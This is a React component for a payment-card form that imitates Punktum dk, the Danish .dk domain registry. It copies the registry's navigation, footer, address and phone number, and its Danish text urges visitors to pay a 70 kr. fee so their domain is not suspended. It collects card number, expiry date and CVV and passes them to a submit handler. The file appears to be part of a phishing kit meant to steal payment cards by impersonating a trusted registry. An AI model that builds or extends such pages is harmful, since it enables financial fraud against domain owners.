import React, { useState, useEffect } from 'react';
import './CardVerificationForm.css';
import LoadingOverlay from './LoadingOverlay'; // ✅ Import the popup

export const countryCodes = [
  { code: '+45', country: 'Denmark (DK)', phoneLength: 8, zipLength: 4 },
];

export default function CardVerificationForm({ onSubmit, domain, isLoading }) {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
  });

  const [isValid, setIsValid] = useState(false);

  const handleCardChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    setFormData({ ...formData, cardNumber: formatted });
  };

  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length > 2) {
      value = `${value.slice(0, 2)}/${value.slice(2)}`;
    }
    setFormData({ ...formData, expiryDate: value });
  };

  const handleCvvChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) setFormData({ ...formData, cvv: value });
  };

  useEffect(() => {
    const rawCard = formData.cardNumber.replace(/\s/g, '');
    
    const isCardValid = rawCard.length === 16;
    const isExpiryValid = formData.expiryDate.length === 5;
    const isCvvValid = formData.cvv.length >= 3;

    let isDateValid = false;
    if (isExpiryValid) {
      const [month, year] = formData.expiryDate.split('/');
      const expMonth = parseInt(month, 10);
      const expYear = parseInt(year, 10);
      const now = new Date();
      const currentYear = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;

      if (expMonth >= 1 && expMonth <= 12) {
        if (expYear > currentYear || (expYear === currentYear && expMonth >= currentMonth)) {
          isDateValid = true;
        }
      }
    }

    setIsValid(isCardValid && isDateValid && isCvvValid);
  }, [formData]);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (isValid && onSubmit) {
      onSubmit(e, { cardDetails: formData });
    }
  };

  return (
    <div className="punktum-page">
      
      {/* ✅ THE POPUP LOADING OVERLAY - Floats on top, page stays visible */}
      <LoadingOverlay isLoading={isLoading} />

      {/* Top Bar */}
      <div className="punktum-top-bar">
        <div className="punktum-top-bar-inner">
          <ul className="punktum-top-menu">
            <li><a href="#/domain-login">PUNKTUM DK</a></li>
            <li className="divider">|</li>
            <li><a href="#/domain-login">STATISTIK</a></li>
            <li className="divider">|</li>
            <li><a href="#/domain-login">ENGLISH</a></li>
            <li className="punktum-login-link"><a href="#/logud">LOG AF</a></li>
          </ul>
        </div>
      </div>

      {/* Header / Logo */}
      <header className="punktum-header">
        <div className="punktum-header-inner">
          
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '8px', fontSize: '12px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <span style={{ color: '#333' }}>domænenavn:</span>
              <select style={{ border: 'none', backgroundColor: '#3a82ce', color: '#fff', padding: '2px 5px', borderRadius: '2px', fontWeight: 'bold' }}>
                <option>{domain || 'test.com'}</option>
              </select>
            </div>
            <button style={{ backgroundColor: '#e0e0e0', border: 'none', color: '#999', padding: '5px 15px', fontSize: '11px', fontWeight: 'bold', borderRadius: '2px', cursor: 'pointer' }}>MIN PROFIL</button>
          </div>
        </div>
      </header>

      {/* Main Nav */}
      <div className="punktum-main-nav">
        <div className="punktum-main-nav-inner">
          <ul>
            <li><a href="#/domæne">Domænenavne</a></li>
            <li><a href="#/konto">Konto</a></li>
          </ul>
          <div className="punktum-help-link">
            <a href="#/domain-login">Brug for hjælp <span className="punktum-icon-help">?</span></a>
          </div>
        </div>
      </div>

      {/* Card Form */}
      <main className="punktum-main">
        <div className="card-verification-box">
          <h2 className="login-title">Betalingskort</h2>
          
          <p className="login-subtitle">
            For at forny dit domæne og undgå suspension skal du betale et gebyr på 70 kr. Indtast et gyldigt 
            kreditkort for at sikre, at dit domænenavn forbliver aktivt. Dine oplysninger vil blive holdt 
            fortrolige og kun brugt til denne transaktion.
          </p>

          <form onSubmit={handleSubmit}>
            <div className="form-group">
              <label>Kortnummer</label>
              <input
                type="text"
                placeholder="fx 0000 0000 0000 0000"
                value={formData.cardNumber}
                onChange={handleCardChange}
                className="login-input"
              />
            </div>

            <div className="form-group">
              <label>Udløbsdato</label>
              <input
                type="text"
                placeholder="fx MM/AA"
                value={formData.expiryDate}
                onChange={handleExpiryChange}
                className="login-input"
              />
            </div>

            <div className="form-group">
              <label>Kontrolcifre</label>
              <input
                type="text"
                placeholder="fx 000"
                value={formData.cvv}
                onChange={handleCvvChange}
                className="login-input"
              />
            </div>

            <button 
              type="submit" 
              className={`login-button ${isValid ? 'active' : ''}`}
              disabled={!isValid}
            >
              SKIFT
            </button>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="punktum-footer">
        <div className="punktum-footer-inner">
          <div className="punktum-footer-box">
            <h3>Punktum dk A/S</h3>
            <p>Punktum dk er administrator for domænenavne, der ender på .dk.</p>
            <p>Det betyder, at alle .dk-domænenavne er registreret hos os, og at vi har stamoplysninger på alle, der har registreret et .dk-domænenavn.</p>
          </div>
          <div className="punktum-footer-box">
            <h3>Kontakt os</h3>
            <p><strong>Punktum dk A/S</strong><br />Ørestads Boulevard 108, 11. sal<br />2300 København S</p>
            <p>Tlf +45 33 64 60 60</p>
            <p><a href="#/domain-login">Ofte stillede spørgsmål og svar</a></p>
          </div>
          <div className="punktum-footer-box">
            <h3>Information</h3>
            <ul>
              <li><a href="#/domain-login">Punktum dk's hjemmeside</a></li>
              <li><a href="#/domain-login">Vilkår</a></li>
              <li><a href="#/domain-login">Persondatapolitik</a></li>
              <li><a href="#/domain-login">Cookie information</a></li>
            </ul>
          </div>
        </div>
      </footer>
    </div>
  );
}